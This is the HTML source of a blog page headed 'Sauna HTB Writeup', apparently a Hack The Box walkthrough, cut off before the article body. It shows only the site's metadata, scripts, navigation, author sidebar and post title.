<!DOCTYPE html><html class="transition bg-[var(--page-bg)] md:text-[16px] text-[14px]" data-astro-cid-yhfudojk lang=en pathname=/posts/sauna/ style=--configHue:250><head><title>Sauna HTB Writeup - Mil4ne</title><meta charset=UTF-8><meta content="Easy Machine" name=description><meta content=Mil4ne name=author><meta content=Mil4ne property=og:site_name><meta content=https://fuwari.vercel.app/posts/sauna/ property=og:url><meta content="Sauna HTB Writeup - Mil4ne" property=og:title><meta content="Easy Machine" property=og:description><meta content=summary_large_image name=twitter:card><meta content=https://fuwari.vercel.app/posts/sauna/ property=twitter:url><meta content="Sauna HTB Writeup - Mil4ne" name=twitter:title><meta content="Easy Machine" name=twitter:description><meta content="width=device-width" name=viewport><meta content="Astro v4.11.3" name=generator><link href=/favicon/favicon-light-32.png rel=icon media="(prefers-color-scheme: light)" sizes=32x32><link href=/favicon/favicon-light-128.png rel=icon media="(prefers-color-scheme: light)" sizes=128x128><link href=/favicon/favicon-light-180.png rel=icon media="(prefers-color-scheme: light)" sizes=180x180><link href=/favicon/favicon-light-192.png rel=icon media="(prefers-color-scheme: light)" sizes=192x192><link href=/favicon/favicon-dark-32.png rel=icon media="(prefers-color-scheme: dark)" sizes=32x32><link href=/favicon/favicon-dark-128.png rel=icon media="(prefers-color-scheme: dark)" sizes=128x128><link href=/favicon/favicon-dark-180.png rel=icon media="(prefers-color-scheme: dark)" sizes=180x180><link href=/favicon/favicon-dark-192.png rel=icon media="(prefers-color-scheme: dark)" sizes=192x192><script>!function(){switch(localStorage.getItem("theme")||"auto"){case"light":document.documentElement.classList.remove("dark");break;case"dark":document.documentElement.classList.add("dark");break;case"auto":window.matchMedia("(prefers-color-scheme: dark)").matches?document.documentElement.classList.add("dark"):document.documentElement.classList.remove("dark")}}()</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Sauna HTB Writeup","description":"Easy Machine","keywords":["Windows","Easy"],"author":{"@type":"Person","name":"Mil4ne","url":"https://fuwari.vercel.app/"},"datePublished":"2024-04-01"}</script><link href=https://cdn.staticfile.org/KaTeX/0.16.9/katex.min.css rel=stylesheet crossorigin=anonymous integrity=sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI+WdtXRGWt2kTvGFasHpSy3SV><link href=https://fuwari.vercel.app/rss.xml rel=alternate title=Mil4ne type=application/rss+xml><script type=module src=/_astro/page.3zT6KwRv.js></script></head><body class="transition min-h-screen" data-astro-cid-yhfudojk style=--configHue:250><div id=config-carrier data-hue=250></div><div><div class="w-full absolute" id=banner-wrapper style=--configHue:250 data-astro-cid-yhfudojk><div class="overflow-hidden relative h-full hidden object-center object-cover"><div class="transition absolute pointer-events-none bg-opacity-50 dark:bg-black/10 inset-0"></div><img alt="Banner image of the blog" decoding=async height=500 loading=lazy src=/_astro/p.BxU1k-P1_ZnpuiV.webp width=500 class="w-full h-full object-cover" style=object-position:center></div></div><div class="min-h-screen gap-4 grid grid-cols-[17.5rem_auto] grid-rows-[auto_auto_1fr_auto] lg:grid-rows-[auto_1fr_auto] max-w-[var(--page-width)] md:px-4 mx-auto px-0 relative"><div class="onload-animation col-span-2 grid-rows-1 z-50" id=top-row><div class="transition absolute -top-8 bg-[var(--card-bg)] h-8 left-0 right-0"></div><div class="flex items-center justify-between card-base h-[4.5rem] max-w-[var(--page-width)] mx-auto overflow-visible px-4 rounded-t-none sticky top-0"><a href=/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-[3.25rem]"><div class="flex items-center flex-row text-[var(--primary)] text-md"><svg data-icon=material-symbols:home-outline-rounded height=1.75rem viewBox="0 0 24 24" width=1.75rem class="mb-1 mr-2"><symbol id=ai:material-symbols:home-outline-rounded><path d="M6 19h3v-5q0-.425.288-.712T10 13h4q.425 0 .713.288T15 14v5h3v-9l-6-4.5L6 10zm-2 0v-9q0-.475.213-.9t.587-.7l6-4.5q.525-.4 1.2-.4t1.2.4l6 4.5q.375.275.588.7T20 10v9q0 .825-.588 1.413T18 21h-4q-.425 0-.712-.288T13 20v-5h-2v5q0 .425-.288.713T10 21H6q-.825 0-1.412-.587T4 19m8-6.75" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:home-outline-rounded></use></svg> Mil4ne</div></a><div class="hidden md:flex"><a href=/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-11" aria-label=Home><div class="flex items-center">Home</div></a><a href=/archive/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-11" aria-label=Archive><div class="flex items-center">Archive</div></a><a href=/about/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-11" aria-label=About><div class="flex items-center">About</div></a><a href=https://mil4ne.pages.dev/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-11" aria-label=Portfolio target=_blank><div class="flex items-center">Portfolio <svg data-icon=fa6-solid:arrow-up-right-from-square height=14 viewBox="0 0 512 512" width=14 class="transition -translate-y-[1px] dark:text-white/[0.2] ml-1 text-black/[0.2]"><symbol id=ai:fa6-solid:arrow-up-right-from-square><path d="M320 0c-17.7 0-32 14.3-32 32s14.3 32 32 32h82.7L201.4 265.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0L448 109.3V192c0 17.7 14.3 32 32 32s32-14.3 32-32V32c0-17.7-14.3-32-32-32zM80 32C35.8 32 0 67.8 0 112v320c0 44.2 35.8 80 80 80h320c44.2 0 80-35.8 80-80V320c0-17.7-14.3-32-32-32s-32 14.3-32 32v112c0 8.8-7.2 16-16 16H80c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h112c17.7 0 32-14.3 32-32s-14.3-32-32-32z" fill=currentColor /></symbol><use xlink:href=#ai:fa6-solid:arrow-up-right-from-square></use></svg></div></a></div><div class=flex><style>astro-island,astro-slot,astro-static-slot{display:contents}</style><script>(self.Astro||(self.Astro={})).load=async t=>{await(await t())()},window.dispatchEvent(new Event("astro:load")),(()=>{var t=Object.defineProperty,e=(e,r,n)=>((e,r,n)=>r in e?t(e,r,{enumerable:!0,configurable:!0,writable:!0,value:n}):e[r]=n)(e,"symbol"!=typeof r?r+"":r,n);{let t={0:t=>s(t),1:t=>n(t),2:t=>new RegExp(t),3:t=>new Date(t),4:t=>new Map(n(t)),5:t=>new Set(n(t)),6:t=>BigInt(t),7:t=>new URL(t),8:t=>new Uint8Array(t),9:t=>new Uint16Array(t),10:t=>new Uint32Array(t)},r=e=>{let[r,n]=e;return r in t?t[r](n):void 0},n=t=>t.map(r),s=t=>"object"!=typeof t||null===t?t:Object.fromEntries(Object.entries(t).map((([t,e])=>[t,r(e)])));class i extends HTMLElement{constructor(){super(...arguments),e(this,"Component"),e(this,"hydrator"),e(this,"hydrate",(async()=>{var t;if(!this.hydrator||!this.isConnected)return;let e=null==(t=this.parentElement)?void 0:t.closest("astro-island[ssr]");if(e)return void e.addEventListener("astro:hydrate",this.hydrate,{once:!0});let r,n=this.querySelectorAll("astro-slot"),i={},o=this.querySelectorAll("template[data-astro-template]");for(let t of o){let e=t.closest(this.tagName);null!=e&&e.isSameNode(this)&&(i[t.getAttribute("data-astro-template")||"default"]=t.innerHTML,t.remove())}for(let t of n){let e=t.closest(this.tagName);null!=e&&e.isSameNode(this)&&(i[t.getAttribute("name")||"default"]=t.innerHTML)}try{r=this.hasAttribute("props")?s(JSON.parse(this.getAttribute("props"))):{}}catch(t){let e=this.getAttribute("component-url")||"<unknown>",r=this.getAttribute("component-export");throw r&&(e+=` (export ${r})`),console.error(`[hydrate] Error parsing props for component ${e}`,this.getAttribute("props"),t),t}await this.hydrator(this)(this.Component,r,i,{client:this.getAttribute("client")}),this.removeAttribute("ssr"),this.dispatchEvent(new CustomEvent("astro:hydrate"))})),e(this,"unmount",(()=>{this.isConnected||this.dispatchEvent(new CustomEvent("astro:unmount"))}))}disconnectedCallback(){document.removeEventListener("astro:after-swap",this.unmount),document.addEventListener("astro:after-swap",this.unmount,{once:!0})}connectedCallback(){if(this.hasAttribute("await-children")&&"interactive"!==document.readyState&&"complete"!==document.readyState){let t=()=>{document.removeEventListener("DOMContentLoaded",t),e.disconnect(),this.childrenConnectedCallback()},e=new MutationObserver((()=>{var e;(null==(e=this.lastChild)?void 0:e.nodeType)===Node.COMMENT_NODE&&"astro:end"===this.lastChild.nodeValue&&(this.lastChild.remove(),t())}));e.observe(this,{childList:!0}),document.addEventListener("DOMContentLoaded",t)}else this.childrenConnectedCallback()}async childrenConnectedCallback(){let t=this.getAttribute("before-hydration-url");t&&await import(t),this.start()}async start(){let t=JSON.parse(this.getAttribute("opts")),e=this.getAttribute("client");if(void 0!==Astro[e])try{await Astro[e]((async()=>{let t=this.getAttribute("renderer-url"),[e,{default:r}]=await Promise.all([import(this.getAttribute("component-url")),t?import(t):()=>()=>{}]),n=this.getAttribute("component-export")||"default";if(n.includes(".")){this.Component=e;for(let t of n.split("."))this.Component=this.Component[t]}else this.Component=e[n];return this.hydrator=r,this.hydrate}),t,this)}catch(t){console.error(`[astro-island] Error hydrating ${this.getAttribute("component-url")}`,t)}else window.addEventListener(`astro:${e}`,(()=>this.start()),{once:!0})}attributeChangedCallback(){this.hydrate()}}e(i,"observedAttributes",["props"]),customElements.get("astro-island")||customElements.define("astro-island",i)}})()</script><astro-island await-children="" client=load component-export=default component-url=/_astro/Search.ilu1Y6_L.js opts={&quot;name&quot;:&quot;Search&quot;,&quot;value&quot;:true} props={} renderer-url=/_astro/client.Cx1FBVJX.js ssr="" uid=Z143CnB><div class="rounded-lg items-center bg-black/[0.04] dark:bg-white/5 dark:focus-within:bg-white/10 dark:hover:bg-white/10 focus-within:bg-black/[0.06] h-11 hidden hover:bg-black/[0.06] lg:flex mr-2 transition-all" id=search-bar><astro-slot name=search-icon><svg data-icon=material-symbols:search height=1.25rem viewBox="0 0 24 24" width=1.25rem class="transition absolute pointer-events-none dark:text-white/30 ml-3 my-auto text-black/30" slot=search-icon><symbol id=ai:material-symbols:search><path d="m19.6 21l-6.3-6.3q-.75.6-1.725.95T9.5 16q-2.725 0-4.612-1.888T3 9.5t1.888-4.612T9.5 3t4.613 1.888T16 9.5q0 1.1-.35 2.075T14.7 13.3l6.3 6.3zM9.5 14q1.875 0 3.188-1.312T14 9.5t-1.312-3.187T9.5 5T6.313 6.313T5 9.5t1.313 3.188T9.5 14" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:search></use></svg></astro-slot><input class="text-sm bg-transparent dark:text-white/50 focus:w-60 outline-0 pl-10 text-black/50 active:w-60 h-full transition-all w-40" placeholder=Search value=""></div><button class="rounded-lg btn-plain scale-animation h-11 active:scale-90 w-11 lg:hidden" aria-label="Search Panel" id=search-switch><astro-slot name=search-switch><svg data-icon=material-symbols:search height=1.25rem viewBox="0 0 24 24" width=1.25rem slot=search-switch><use xlink:href=#ai:material-symbols:search></use></svg></astro-slot></button><div class="absolute float-panel-closed float-panel right-4 left-4 md:left-[unset] md:w-[30rem] p-2 rounded-2xl search-panel shadow-2xl top-20" id=search-panel><div class="flex items-center relative bg-black/[0.04] dark:bg-white/5 dark:focus-within:bg-white/10 dark:hover:bg-white/10 focus-within:bg-black/[0.06] h-11 hover:bg-black/[0.06] lg:hidden rounded-xl transition-all" id=search-bar-inside><astro-slot name=search-icon><svg data-icon=material-symbols:search height=1.25rem viewBox="0 0 24 24" width=1.25rem class="transition absolute pointer-events-none dark:text-white/30 ml-3 my-auto text-black/30" slot=search-icon><symbol id=ai:material-symbols:search><path d="m19.6 21l-6.3-6.3q-.75.6-1.725.95T9.5 16q-2.725 0-4.612-1.888T3 9.5t1.888-4.612T9.5 3t4.613 1.888T16 9.5q0 1.1-.35 2.075T14.7 13.3l6.3 6.3zM9.5 14q1.875 0 3.188-1.312T14 9.5t-1.312-3.187T9.5 5T6.313 6.313T5 9.5t1.313 3.188T9.5 14" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:search></use></svg></astro-slot><input class="text-sm bg-transparent dark:text-white/50 focus:w-60 outline-0 pl-10 text-black/50 absolute inset-0" placeholder=Search value=""></div></div><template data-astro-template=arrow-icon><svg data-icon=fa6-solid:chevron-right height=0.75rem viewBox="0 0 320 512" width=0.75rem class="transition text-[var(--primary)] my-auto translate-x-0.5" slot=arrow-icon><symbol id=ai:fa6-solid:chevron-right><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256L73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z" fill=currentColor /></symbol><use xlink:href=#ai:fa6-solid:chevron-right></use></svg></template></astro-island><astro-island await-children="" client=load component-export=default component-url=/_astro/LightDarkSwitch.CAE8sFjn.js opts={&quot;name&quot;:&quot;LightDarkSwitch&quot;,&quot;value&quot;:true} props={} renderer-url=/_astro/client.Cx1FBVJX.js ssr="" uid=Z3Vi0Q><div class="relative z-50" role=menu tabindex=-1><button class="rounded-lg btn-plain scale-animation h-11 active:scale-90 w-11 relative" aria-label="Light/Dark Mode" id=scheme-switch role=menuitem><div class="absolute opacity-0"></div><div class="absolute opacity-0"></div><div class=absolute></div></button><div class="transition absolute -right-2 float-panel-closed hidden lg:block pt-5 top-11" id=light-dark-panel><div class="card-base float-panel p-2"><button class="transition flex items-center rounded-lg active:scale-95 btn-plain font-medium h-9 justify-start px-3 scale-animation w-full whitespace-nowrap mb-0.5">Light</button> <button class="transition flex items-center rounded-lg active:scale-95 btn-plain font-medium h-9 justify-start px-3 scale-animation w-full whitespace-nowrap mb-0.5">Dark</button> <button class="transition flex items-center rounded-lg active:scale-95 btn-plain font-medium h-9 justify-start px-3 scale-animation w-full whitespace-nowrap current-theme-btn">System</button></div></div></div></astro-island><button class="rounded-lg btn-plain scale-animation h-11 active:scale-90 w-11 md:hidden" aria-label=Menu id=nav-menu-switch name="Nav Menu"><svg data-icon=material-symbols:menu-rounded height=1.25rem viewBox="0 0 24 24" width=1.25rem><use xlink:href=#ai:material-symbols:menu-rounded></use></svg></button></div><div class="absolute float-panel-closed float-panel right-4 fixed px-2 py-2 transition-all" id=nav-menu-panel><a href=/ class="transition flex items-center rounded-lg active:bg-[var(--btn-plain-bg-active)] gap-8 group hover:bg-[var(--btn-plain-bg-hover)] justify-between pl-3 pr-1 py-2"><div class="transition font-bold dark:text-white/75 text-black/75 group-active:text-[var(--primary)] group-hover:text-[var(--primary)]">Home</div><svg data-icon=material-symbols:chevron-right-rounded height=20 viewBox="0 0 24 24" width=20 class="transition text-[var(--primary)]"><use xlink:href=#ai:material-symbols:chevron-right-rounded></use></svg> </a><a href=/archive/ class="transition flex items-center rounded-lg active:bg-[var(--btn-plain-bg-active)] gap-8 group hover:bg-[var(--btn-plain-bg-hover)] justify-between pl-3 pr-1 py-2"><div class="transition font-bold dark:text-white/75 text-black/75 group-active:text-[var(--primary)] group-hover:text-[var(--primary)]">Archive</div><svg data-icon=material-symbols:chevron-right-rounded height=20 viewBox="0 0 24 24" width=20 class="transition text-[var(--primary)]"><use xlink:href=#ai:material-symbols:chevron-right-rounded></use></svg> </a><a href=/about/ class="transition flex items-center rounded-lg active:bg-[var(--btn-plain-bg-active)] gap-8 group hover:bg-[var(--btn-plain-bg-hover)] justify-between pl-3 pr-1 py-2"><div class="transition font-bold dark:text-white/75 text-black/75 group-active:text-[var(--primary)] group-hover:text-[var(--primary)]">About</div><svg data-icon=material-symbols:chevron-right-rounded height=20 viewBox="0 0 24 24" width=20 class="transition text-[var(--primary)]"><use xlink:href=#ai:material-symbols:chevron-right-rounded></use></svg> </a><a href=https://mil4ne.pages.dev/ class="transition flex items-center rounded-lg active:bg-[var(--btn-plain-bg-active)] gap-8 group hover:bg-[var(--btn-plain-bg-hover)] justify-between pl-3 pr-1 py-2" target=_blank><div class="transition font-bold dark:text-white/75 text-black/75 group-active:text-[var(--primary)] group-hover:text-[var(--primary)]">Portfolio</div><svg data-icon=fa6-solid:arrow-up-right-from-square height=12 viewBox="0 0 512 512" width=12 class="transition -translate-x-1 dark:text-white/25 text-black/25"><use xlink:href=#ai:fa6-solid:arrow-up-right-from-square></use></svg></a></div></div><script>!async function(){const i=await import("/pagefind/pagefind.js");await i.options({excerptLength:20}),i.init(),window.pagefind=i,i.search("")}()</script></div><div class="w-full col-span-2 lg:col-span-1 lg:max-w-[17.5rem] lg:row-end-3 lg:row-start-2 onload-animation row-end-4 row-start-3" id=sidebar><div class="flex w-full gap-4 flex-col mb-4"><div class="card-base p-3"><a href=/about/ class="overflow-hidden relative rounded-xl active:scale-95 block group lg:max-w-none lg:mt-0 lg:mx-0 max-w-[240px] mb-3 mt-1 mx-auto" aria-label="Go to About Page"><div class="transition flex items-center justify-center absolute group-active:bg-black/50 group-hover:bg-black/30 h-full pointer-events-none w-full z-50"><svg data-icon=fa6-regular:address-card height=1em viewBox="0 0 576 512" width=1.13em class="transition group-hover:opacity-100 opacity-0 text-5xl text-white"><symbol id=ai:fa6-regular:address-card><path d="M512 80c8.8 0 16 7.2 16 16v320c0 8.8-7.2 16-16 16H64c-8.8 0-16-7.2-16-16V96c0-8.8 7.2-16 16-16zM64 32C28.7 32 0 60.7 0 96v320c0 35.3 28.7 64 64 64h448c35.3 0 64-28.7 64-64V96c0-35.3-28.7-64-64-64zm144 224a64 64 0 1 0 0-128a64 64 0 1 0 0 128m-32 32c-44.2 0-80 35.8-80 80c0 8.8 7.2 16 16 16h192c8.8 0 16-7.2 16-16c0-44.2-35.8-80-80-80zm200-144c-13.3 0-24 10.7-24 24s10.7 24 24 24h80c13.3 0 24-10.7 24-24s-10.7-24-24-24zm0 96c-13.3 0-24 10.7-24 24s10.7 24 24 24h80c13.3 0 24-10.7 24-24s-10.7-24-24-24z" fill=currentColor /></symbol><use xlink:href=#ai:fa6-regular:address-card></use></svg></div><div class="overflow-hidden relative h-full lg:mt-0 lg:w-full mx-auto"><div class="transition absolute pointer-events-none bg-opacity-50 dark:bg-black/10 inset-0"></div><img alt="Profile Image of the Author" decoding=async height=500 loading=lazy src=/_astro/p.BxU1k-P1_ZnpuiV.webp width=500 class="w-full h-full object-cover" style=object-position:center></div></a><div class="transition font-bold dark:text-neutral-50 mb-1 text-center text-xl">Mil4ne</div><div class="transition mb-2 bg-[var(--primary)] h-1 mx-auto rounded-full w-5"></div><div class="transition text-center mb-2.5 text-neutral-400">#road-to-cpts</div><div class="flex gap-2 justify-center mb-1"><a href="" class="rounded-lg btn-regular active:scale-90 h-10 w-10" aria-label=Twitter target=_blank rel=me><svg data-icon=fa6-brands:discord height=1.5rem viewBox="0 0 640 512" width=1.5rem><symbol id=ai:fa6-brands:discord><path d="M524.531 69.836a1.5 1.5 0 0 0-.764-.7A485.065 485.065 0 0 0 404.081 32.03a1.816 1.816 0 0 0-1.923.91a337.461 337.461 0 0 0-14.9 30.6a447.848 447.848 0 0 0-134.426 0a309.541 309.541 0 0 0-15.135-30.6a1.89 1.89 0 0 0-1.924-.91a483.689 483.689 0 0 0-119.688 37.107a1.712 1.712 0 0 0-.788.676C39.068 183.651 18.186 294.69 28.43 404.354a2.016 2.016 0 0 0 .765 1.375a487.666 487.666 0 0 0 146.825 74.189a1.9 1.9 0 0 0 2.063-.676A348.2 348.2 0 0 0 208.12 430.4a1.86 1.86 0 0 0-1.019-2.588a321.173 321.173 0 0 1-45.868-21.853a1.885 1.885 0 0 1-.185-3.126a251.047 251.047 0 0 0 9.109-7.137a1.819 1.819 0 0 1 1.9-.256c96.229 43.917 200.41 43.917 295.5 0a1.812 1.812 0 0 1 1.924.233a234.533 234.533 0 0 0 9.132 7.16a1.884 1.884 0 0 1-.162 3.126a301.407 301.407 0 0 1-45.89 21.83a1.875 1.875 0 0 0-1 2.611a391.055 391.055 0 0 0 30.014 48.815a1.864 1.864 0 0 0 2.063.7A486.048 486.048 0 0 0 610.7 405.729a1.882 1.882 0 0 0 .765-1.352c12.264-126.783-20.532-236.912-86.934-334.541M222.491 337.58c-28.972 0-52.844-26.587-52.844-59.239s23.409-59.241 52.844-59.241c29.665 0 53.306 26.82 52.843 59.239c0 32.654-23.41 59.241-52.843 59.241m195.38 0c-28.971 0-52.843-26.587-52.843-59.239s23.409-59.241 52.843-59.241c29.667 0 53.307 26.82 52.844 59.239c0 32.654-23.177 59.241-52.844 59.241" fill=currentColor /></symbol><use xlink:href=#ai:fa6-brands:discord></use></svg> </a><a href=https://www.linkedin.com/in/mil4ne/ class="rounded-lg btn-regular active:scale-90 h-10 w-10" aria-label=Linkedin target=_blank rel=me><svg data-icon=fa6-brands:linkedin height=1.5rem viewBox="0 0 448 512" width=1.5rem><symbol id=ai:fa6-brands:linkedin><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5m282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9z" fill=currentColor /></symbol><use xlink:href=#ai:fa6-brands:linkedin></use></svg> </a><a href=https://github.com/mil4ne class="rounded-lg btn-regular active:scale-90 h-10 w-10" aria-label=GitHub target=_blank rel=me><svg data-icon=fa6-brands:github height=1.5rem viewBox="0 0 496 512" width=1.5rem><symbol id=ai:fa6-brands:github><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6c-3.3.3-5.6-1.3-5.6-3.6c0-2 2.3-3.6 5.2-3.6c3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9c2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9c.3 2 2.9 3.3 5.9 2.6c2.9-.7 4.9-2.6 4.6-4.6c-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2c12.8 2.3 17.3-5.6 17.3-12.1c0-6.2-.3-40.4-.3-61.4c0 0-70 15-84.7-29.8c0 0-11.4-29.1-27.8-36.6c0 0-22.9-15.7 1.6-15.4c0 0 24.9 2 38.6 25.8c21.9 38.6 58.6 27.5 72.9 20.9c2.3-16 8.8-27.1 16-33.7c-55.9-6.2-112.3-14.3-112.3-110.5c0-27.5 7.6-41.3 23.6-58.9c-2.6-6.5-11.1-33.3 2.6-67.9c20.9-6.5 69 27 69 27c20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27c13.7 34.7 5.2 61.4 2.6 67.9c16 17.7 25.8 31.5 25.8 58.9c0 96.5-58.9 104.2-114.8 110.5c9.2 7.9 17 22.9 17 46.4c0 33.7-.3 75.4-.3 83.6c0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252C496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2c1.6 1.6 3.9 2.3 5.2 1c1.3-1 1-3.3-.7-5.2c-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9c1.6 1 3.6.7 4.3-.7c.7-1.3-.3-2.9-2.3-3.9c-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2c2.3 2.3 5.2 2.6 6.5 1c1.3-1.3.7-4.3-1.3-6.2c-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9c1.6 2.3 4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2c-1.4-2.3-4-3.3-5.6-2" fill=currentColor /></symbol><use xlink:href=#ai:fa6-brands:github></use></svg></a></div></div></div><div class="flex w-full gap-4 flex-col top-4 top-4 sticky"><widget-layout class="onload-animation card-base pb-4" data-astro-cid-ombj2xyq data-id=categories style=animation-delay:150ms;--collapsedHeight:7.5rem><div class="transition font-bold before:absolute before:bg-[var(--primary)] before:rounded-md before:h-4 before:left-[-16px] before:top-[5.5px] before:w-1 dark:text-neutral-100 mb-2 ml-8 mt-4 relative text-lg text-neutral-900" style=--collapsedHeight:7.5rem data-astro-cid-ombj2xyq>Categories</div><div class="overflow-hidden collapse-wrapper px-4" id=categories style=--collapsedHeight:7.5rem data-astro-cid-ombj2xyq><a href=/archive/category/HackTheBox/ ><button class="rounded-lg active:bg-[var(--btn-plain-bg-active)] hover:bg-[var(--btn-plain-bg-hover)] bg-none dark:hover:text-[var(--primary)] dark:text-neutral-300 h-10 hover:pl-3 hover:text-[var(--primary)] pl-2 text-neutral-700 transition-all w-full"><div class="flex items-center justify-between mr-2 relative"><div class="overflow-hidden overflow-ellipsis whitespace-nowrap text-left">HackTheBox</div><div class="transition flex items-center rounded-lg bg-[oklch(0.95_0.025_var(--hue))] dark:bg-[var(--primary)] dark:text-[var(--deep-text)] font-bold h-7 justify-center min-w-[2rem] ml-4 text-[var(--btn-content)] text-sm">18</div></div></button></a></div></widget-layout><widget-layout class="onload-animation card-base pb-4" data-astro-cid-ombj2xyq data-id=tags style=animation-delay:.2s;--collapsedHeight:7.5rem><div class="transition font-bold before:absolute before:bg-[var(--primary)] before:rounded-md before:h-4 before:left-[-16px] before:top-[5.5px] before:w-1 dark:text-neutral-100 mb-2 ml-8 mt-4 relative text-lg text-neutral-900" style=--collapsedHeight:7.5rem data-astro-cid-ombj2xyq>Tags</div><div class="overflow-hidden collapse-wrapper px-4" id=tags style=--collapsedHeight:7.5rem data-astro-cid-ombj2xyq><div class="flex flex-wrap gap-2"><a href=/archive/tag/Easy/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Easy tag">Easy </a><a href=/archive/tag/Hard/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Hard tag">Hard </a><a href=/archive/tag/Linux/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Linux tag">Linux </a><a href=/archive/tag/Medium/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Medium tag">Medium </a><a href=/archive/tag/Windows/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Windows tag">Windows</a></div></div></widget-layout></div></div><div class="overflow-hidden onload-animation col-span-2 lg:col-span-1 row-end-3 row-start-2" id=content-wrapper><main class=transition-fade id=swup><div class="flex w-full mb-4 overflow-hidden relative rounded-[var(--radius-large)]"><div class="w-full relative card-base md:px-9 pb-4 pt-6 px-6 z-10" id=post-container><div class="transition flex dark:text-white/30 flex-row gap-5 mb-3 onload-animation text-black/30"><div class="flex items-center flex-row"><div class="transition flex items-center justify-center bg-black/5 dark:bg-white/10 dark:text-white/50 h-6 mr-2 rounded-md text-black/50 w-6"><svg data-icon=material-symbols:notes-rounded height=1em viewBox="0 0 24 24" width=1em><symbol id=ai:material-symbols:notes-rounded><path d="M4 18q-.425 0-.712-.288T3 17t.288-.712T4 16h10q.425 0 .713.288T15 17t-.288.713T14 18zm0-5q-.425 0-.712-.288T3 12t.288-.712T4 11h16q.425 0 .713.288T21 12t-.288.713T20 13zm0-5q-.425 0-.712-.288T3 7t.288-.712T4 6h16q.425 0 .713.288T21 7t-.288.713T20 8z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:notes-rounded></use></svg></div><div class=text-sm>1321 words</div></div><div class="flex items-center flex-row"><div class="transition flex items-center justify-center bg-black/5 dark:bg-white/10 dark:text-white/50 h-6 mr-2 rounded-md text-black/50 w-6"><svg data-icon=material-symbols:schedule-outline-rounded height=1em viewBox="0 0 24 24" width=1em><symbol id=ai:material-symbols:schedule-outline-rounded><path d="M13 11.6V8q0-.425-.288-.712T12 7t-.712.288T11 8v3.975q0 .2.075.388t.225.337l3.3 3.3q.275.275.7.275T16 16t.275-.7t-.275-.7zM12 22q-2.075 0-3.9-.788t-3.175-2.137T2.788 15.9T2 12t.788-3.9t2.137-3.175T8.1 2.788T12 2t3.9.788t3.175 2.137T21.213 8.1T22 12t-.788 3.9t-2.137 3.175t-3.175 2.138T12 22m0-2q3.325 0 5.663-2.337T20 12t-2.337-5.663T12 4T6.337 6.338T4 12t2.338 5.663T12 20" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:schedule-outline-rounded></use></svg></div><div class=text-sm>7 minutes</div></div></div><div class="onload-animation relative"><div class="transition font-bold before:absolute before:bg-[var(--primary)] before:rounded-md before:h-5 before:left-[-1.125rem] before:top-[0.75rem] block dark:text-white/90 mb-3 md:before:w-1 md:text-[2.5rem]/[2.75rem] text-3xl text-black/90 w-full" data-pagefind-body data-pagefind-meta=title data-pagefind-weight=10>Sauna HTB Writeup</div></div><div class=onload-animation><div class="flex items-center gap-4 dark:text-neutral-400 flex-wrap gap-x-4 gap-y-2 mb-5 text-neutral-500" data-astro-cid-aj5jodn5><div class="flex items-center" data-astro-cid-aj5jodn5><div class=meta-icon data-astro-cid-aj5jodn5><svg data-icon=material-symbols:calendar-today-outline-rounded height=1em viewBox="0 0 24 24" width=1em class=text-xl data-astro-cid-aj5jodn5><symbol id=ai:material-symbols:calendar-today-outline-rounded><path d="M5 22q-.825 0-1.412-.587T3 20V6q0-.825.588-1.412T5 4h1V3q0-.425.288-.712T7 2t.713.288T8 3v1h8V3q0-.425.288-.712T17 2t.713.288T18 3v1h1q.825 0 1.413.588T21 6v14q0 .825-.587 1.413T19 